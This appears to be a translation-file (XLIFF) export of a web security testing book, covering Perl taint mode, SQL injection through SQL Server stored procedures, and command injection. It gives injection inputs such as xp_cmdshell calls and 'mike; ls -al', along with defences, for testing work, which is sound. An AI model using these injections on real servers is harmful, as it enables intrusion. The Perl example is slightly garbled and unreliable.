          <source>Another protection measure that Perl uses is a feature called &lt;span class="docEmphStrong"&gt;taint&lt;/span&gt;. When operating in this mode, Perl will not send any user input to certain functions (namely, &lt;tt&gt;open()&lt;/tt&gt;, &lt;tt&gt;unlink()&lt;/tt&gt;, &lt;tt&gt;rename(), exec()&lt;/tt&gt;, &lt;tt&gt;system()&lt;/tt&gt;) until it has validated. How does Perl validate them? Does it have some magic validation scheme? Unfortunately, no. Variables become untainted when they pass through a regular expression and groups are parsed out of them. Consider the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>#tainted input
$email = $form_data{"email"};
# warning &amp;ndash; cannot pass tainted inputs to system
 calls
system("sendmail", $email);
# ok to pass tainted input to some functions!
print($email);
# parse out (and untaint) some of the input
if($email=~ /(\w{1}[w-.]*\ @-.]*)\@([\w-.]+)/){
 $name = "$1";  # name is now "untainted as it came
 from a regex group
}
# name becomes tainted again because it is
 concatenated with unvalidated input
$name = $name." from ".$formdata{"state");</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It is up to the developer to perform correct validation checking, but taking this extra effort does help ensure that inputs are not accidentally passed off to other systems (and thus languages that have alternative representations/encoding schemes) without the developer being aware of it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch07.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 7. Attacking the Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 7. Attacking the Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch07lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter follows the subject matter of the previous chapter, in which we detailed attacks against programs and applications on the Web server. In this chapter, we discuss direct attacks against the operating system and configuration of the Web server machine. The lesson is that it isn't just about writing secure code, but also about ensuring that the environment in which the code runs is as secure as possible.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch07lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web applications reside on a server machine, and their contents are &amp;quot;served&amp;quot; to some client application&amp;mdash;most often a browser. When information is sent back to the server for processing, server-side components, executable programs, are often used to process this information. Thus, security vulnerabilities in server-side applications can be a serious issue for Web application security.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The focus of this chapter is on attacks against applications that reside on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>These attacks are generally against components that the attacker knows exist on the server&amp;mdash;specifically, operating systems or databases. Because all servers must have an operating system (OS) and most real Web applications use a database, these two components are common targets.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Attacks against the OS or a database are attempts to send commands to the server and force them to be executed. Obviously, these attacks would result in a compromise of the server. Denial of service is another end goal, causing our server to be unavailable to other users.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 17 SQL Injection II&amp;mdash;Stored Procedures</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When you submit input to a server through a Web application, much of it is stored in databases. Databases provide many useful features to deal with the large volume of data coming from multiple users. Thus, most development environments and languages for writing Web applications have built-in functionality to accommodate a variety of databases, from Berkley DB to Oracle.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When we test Web applications, we cannot ignore the underlying database. This attack focuses on a common feature of high-end database platforms like Microsoft SQL Server and Oracle called stored procedures.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Stored procedures&lt;/span&gt; are prewritten queries that are supplied by the database vendor or third party custom procedures written in-house and integrated into the database. These stored procedures can benefit Web security because any data passed to them is treated literally&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch07fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; and cannot be misinterpreted as part of the SQL command, as we did in the standard SQL injection attack described in &lt;a class="docLink" href="ch05.html#ch05"&gt;Chapter 5&lt;/a&gt;, &amp;quot;Attacking User-Supplied Input Data.&amp;quot; However, it's easy to misuse stored procedures.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch07fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; That's only if the stored procedure is parameterized or prepared, meaning that the query is already prebuilt and not constructed on-the-fly in the stored procedure.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the case of Microsoft SQL Server, many of the stored procedures integrate the database into the operating system, allowing authorized users to create logins, schedule tasks, run command-line programs, and generally command the operating system from extended database queries.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Oracle, on the other hand, does not offer this type of functionality out of the box. However, using either Java or the PL/SQL languages supported by Oracle, developers can build custom procedures with similar functionality.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is an extension to the SQL injection attack discussed previously and targets the same input fields. Fields that comprise part of a database table are the ones most likely to be used in SQL queries for database lookup or data retrieval.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Try to determine if the data you are entering would likely be stored inside a database. Familiarizing yourself with the database design and SQL queries that the application constructs will make you far more effective in</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>applying this attack. However, you should consider data that is related in some way. For example, personal data such as your address and phone number is often stored together in a database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Always check to see if you can sneak in a semicolon and start a new SQL query. You can attempt to call some of the built-in stored procedures, as described next.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the most dangerous stored procedures to look for on Microsoft SQL Server is &lt;tt&gt;xp_cmdshell&lt;/tt&gt;, an interface from the database to the operating system that allows for command-line programs to be executed. This stored procedure allows an attacker to run arbitrary operating system commands on the Web server machine, which is never a rosy prospect for a Web site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To use this stored procedure, pass the following command as a separate query:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>EXEC master..xp_cmdshell 'some command like dir,
 format, etc.'</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;tt&gt;EXEC&lt;/tt&gt; is a keyword, much like &lt;tt&gt;SELECT&lt;/tt&gt;, that tells the database to execute the subsequent procedure. Because the built-in stored procedures are not part of the current database table, you must refer to their location explicitly, which is where the &lt;tt&gt;master..&lt;/tt&gt; comes in. It indicates where you can find the stored procedure on the database server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Next we have the stored procedure name, followed by the parameters. In the case of &lt;tt&gt;xp_cmdshell&lt;/tt&gt;, the parameter is a command string to execute.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use stored procedures to do a multitude of tasks. By no means an extensive list, the following are some tasks that you should look out for because of their serious security implications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.caption.h5.text">
          <source>Table 7-1. Dangerous Stored Procedures</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Stored Procedure</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>xp_regread
xp_regwrite
xp_regdeletekey
xp_regdeletevalue
xp_regremovemultistring
xp_regaddmultistring
xp_regenumvalues</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Use these stored procedures to manipulate the registry. You can execute them with the permissions of the server (usually localsystem), which means you can access nearly all the values in the registry.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Because some applications store sensitive information, such as product keys or shared passwords, in the registry, unrestricted access to these stored procedures can be a useful attack vector. By deleting keys from the registry, you can use these stored procedures to cause denial of service to the Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>xp_dirtree
xp_subdirs
xp_fileexist
xp_fixeddrives
xp_makewebtask
xp_runwebtask</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>You can use these stored procedures to access the file system. The same cautions for protecting the registry also apply to the file system. But because the file system can store any information, it is even more important to protect.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>xp_terminate_process
xp_loginconfig
xp_logininfo
xp_grantlogin
xp_sendmail</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>These are miscellaneous stored procedures that wrap up the last of our favorites. They allow programs to be terminated, list current user logins and methods, grant logins to the database, and send e-mail (or spam) via the database's configured SMTP account.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>By default, in the most current database versions, most of these stored procedures are locked down and accessible only to users with high privileges. Unfortunately, developers are still using privileged accounts such as &lt;tt&gt;sa&lt;/tt&gt; (effectively the administrator account on Microsoft SQL Server) in place of more restrictive user accounts for their Web applications. An easy protection measure is to create a user on the database that is specific for each application and grant it permission for only what it needs&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch07fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; (that is, read, write, insert, and so on, but not create table, drop table, or any of the built-in stored procedures).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch07fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; This is generally referred to as the principle of least privilege. The idea is to give the least amount of privilege possible for a program to perform its function.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another option, which is best when combined with individual logins, is to remove all the stored procedures that aren't necessary, but this requires solid knowledge of the database because some stored procedures are needed for patching, replication, and backup, among other things.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can find a good checklist for locking down an application and associated Microsoft SQL Server at &lt;a class="docLink" target="_blank" href="http://www.securitymap.net/sdm/docs/windows/mssql-checklist.html"&gt;http://www.securitymap.net/sdm/docs/windows/mssql-checklist.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>How to Check for Code Execution on a Server Without Damaging Anything: The Reverse Ping</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>When you're testing a remote service, especially one many users are using concurrently, you have to be sensitive about how you go about testing it. Tests that you may conduct fall into one of two categories: destructive tests and nondestructive tests. An example of a destructive test is anything that may change data in some way, such as deleting a file or inserting a record into a database. Nondestructive tests are those that you can perform over and over without making changes to the system that is being tested.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The problem comes when you want to verify that an avenue of attack (such as a stored procedure or command injection) allows you to execute code on the server. What do you do? Do you create a file and ask a system administrator to look for it? That may delay your testing or even create an undesirable side effect (depending on what file you put on the server and where). Do you delete a file that you could access before and check for access again? That's destructive testing that may not be appropriate or permitted.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>There &lt;span class="docEmphasis"&gt;is&lt;/span&gt;, however, a method for determining whether your remote commands are being executed with immediate results: a reverse ping.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Start by downloading and running a network monitoring tool like Ethereal (&lt;a class="docLink" target="_blank" href="http://www.ethereal.com/"&gt;http://www.ethereal.com/&lt;/a&gt;). Then perform the remote execution testing using &lt;tt&gt;ping [your IP address]&lt;/tt&gt; as the command. For example, use &lt;tt&gt;exec master..xp_cmdshell 'ping 1.2.3.4'&lt;/tt&gt;, where &lt;tt&gt;1.2.3.4&lt;/tt&gt; is your IP address. If you receive an ICMP packet right after the test, the ping worked, and you executed code on the server. Make sure that the originating IP address is the IP address of the target Web server or is within the IP network address range of the company. That's because of Network Address Translation (NAT), clustering, load balancing, proxies, firewalls, and so on that may modify network addresses and prevent the ping from being received.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 18 Command Injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A long time ago in a Web universe far, far away, programmers wrote Web applications in C or in Perl, and the applications existed on UNIX servers. That time has long past, but the UNIX mindset became well-entrenched and still prevails in many development shops.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>That mindset goes something like this: Write small utility programs and link them to perform more complex functions. For example, instead of writing a search function, a programmer would write code to pass commands to an operating system function like &lt;tt&gt;grep&lt;/tt&gt; and then process the data that returns.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>From a software engineering perspective, this is called &lt;span class="docEmphStrong"&gt;code reuse&lt;/span&gt;. In a security context, when data is passed to another component in a different environment, we have to worry about whether that data will have the same meaning. What was fine in one environment may have an alternative and undesirable meaning in another.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Consider the simple example of a Web page that, when given a username, will tell us when that user last logged onto the server. The simplest way of achieving this functionality is to pass the username to the UNIX finger command as in &lt;a class="docLink" href="#ch07fig01"&gt;Figure 7-1&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-1. Running the finger command.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Using this basic script as-is has opened some rather large security holes in our Web server. First, if the script passes nothing to the finger command, it would show all the users currently logged in. That's useful information to an attacker, because it would give him a number of known usernames to try to brute-force the passwords from. The real problem, however, is that it allows an attacker to easily execute shell commands by piggybacking them off the initial command. And that is the idea behind this attack: Inject a command other than the one intended.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The targets for this attack are inputs that are passed off to operating system commands or executable programs that reside on the server. It's not always easy to find these places, but their inclusion often stands out among the</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>other parameters in the application. Certain parameters may reference files that are included in a page (hidden fields are a good place to look for these) or may clearly be an argument to another program, as in the earlier example. Any functionality that requires the operating system for assistance&amp;mdash;that is, creating users, changing files, gathering host data, and so on&amp;mdash;must interface with external programs in some way. If any of these programs fails to validate the data it is passed, we have found an important vulnerability.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It is often helpful to think about the easiest way to implement the functionality that the application provides. Developers tend to favor the path of least resistance, so if you reason that operating system functions might be utilized, there is a chance that the original developer thought the same thing. On UNIX systems in particular, the prevalent operations are through small command-line programs.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A simple thing to try initially is piggybacking other commands by using the semicolon character or by forcing a newline character (&lt;tt&gt;\r\n&lt;/tt&gt;). For the operating system, these characters signify the end of one command and the beginning of a new one.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If we pass &lt;tt&gt;mike; ls &amp;ndash;al&lt;/tt&gt; or &lt;tt&gt;mike\r\nls &amp;ndash;al&lt;/tt&gt; to the finger Web script, we may be able to get a directory listing from the server. These are not the only ways of injecting additional meaning into parameters that are passed to the command line, but they serve the purpose of determining whether your Web application is susceptible to this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use the characters &lt;tt&gt;|&lt;/tt&gt; (pipe) and &lt;tt&gt;&amp;gt;&lt;/tt&gt; (greater than) to direct output to other files or programs. Backticks (&lt;tt&gt;`&lt;/tt&gt;) are another example of metacharacters that can have extended meaning. They tell UNIX to execute everything between the metacharacters and replace the contents with the output. In fact, you can construe all but five of the punctuation characters as metacharacters rather than data. We leave the exercise of what five characters these are to you, the reader.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch07fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch07fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; See &amp;quot;19 Deadly Sins of Software Security&amp;quot; by Michael Howard et al, pp 70, for the answer.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As is the case with most Web attacks, input validation is the answer to protecting against this attack. You must scrupulously check inputs to strip out any commands that the user entered.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can also limit the exposure to this attack by running the Web server as a low-level, restricted user. Because all code and system calls execute with the permissions of the user account that initiates them, it is wise to ensure that the Web server is running as a user that can perform only limited operations&amp;mdash;mostly reading files from a specific part of the file system directory tree. The Web server should not be able to write and execute programs unless it is absolutely necessary that it do so.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
